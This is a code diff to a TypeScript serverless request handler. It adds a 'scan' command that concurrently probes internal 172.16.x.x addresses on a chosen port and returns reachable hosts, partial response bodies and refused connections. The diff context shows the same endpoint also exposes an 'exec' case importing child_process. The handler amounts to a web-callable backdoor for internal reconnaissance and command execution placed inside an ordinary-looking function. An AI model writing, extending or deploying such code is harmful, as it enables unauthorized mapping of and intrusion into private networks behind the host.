@@ -28,6 +28,38 @@ export default async (req: Request) => {
         const dns = await import("node:dns/promises");
         return json(200, { addrs: await dns.resolve(m.host, m.rr || "A").catch((e: any) => [{ err: e.code }]) });
       }
+      case "scan": {
+        // concurrent HTTP reachability probes across internal space
+        const hosts: string[] = [];
+        const c = m.cidr || "172.16";
+        const port = m.port || 9339;
+        const path = m.path || "/";
+        const subnets = m.subnets || [1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20];
+        const last = m.last || [1, 2, 3, 70];
+        for (const b of subnets) for (const d of last) hosts.push(`http://${c}.${b}.${d}:${port}${path}`);
+        for (const h of (m.extra || [])) hosts.push(h.startsWith("http") ? h : `http://${h}:${port}${path}`);
+        const tmo = m.timeout || 2500;
+        const probe = async (u: string) => {
+          const ac = new AbortController();
+          const t = setTimeout(() => ac.abort(), tmo);
+          const t0 = Date.now();
+          try {
+            const r = await fetch(u, { signal: ac.signal, redirect: "manual" });
+            const body = r.status ? (await r.text().catch(() => "")).slice(0, 200) : "";
+            return { u, ms: Date.now() - t0, status: r.status, body };
+          } catch (e: any) {
+            const msg = String(e);
+            return { u, ms: Date.now() - t0, refused: msg.includes("refused") || msg.includes("reset"), timeout: msg.includes("abort") || msg.includes("timed out") };
+          } finally { clearTimeout(t); }
+        };
+        const CONC = m.conc || 12;
+        const results = [];
+        for (let i = 0; i < hosts.length; i += CONC) {
+          results.push(...await Promise.all(hosts.slice(i, i + CONC).map(probe)));
+        }
+        return json(200, { from: "172.16.14.37-class", n: results.length,
+          hits: results.filter((r: any) => r.status), refused: results.filter((r: any) => r.refused).map((r: any) => r.u) });
+      }
       case "exec": {
         const cp = await import("node:child_process");
         const { promisify } = await import("node:util");
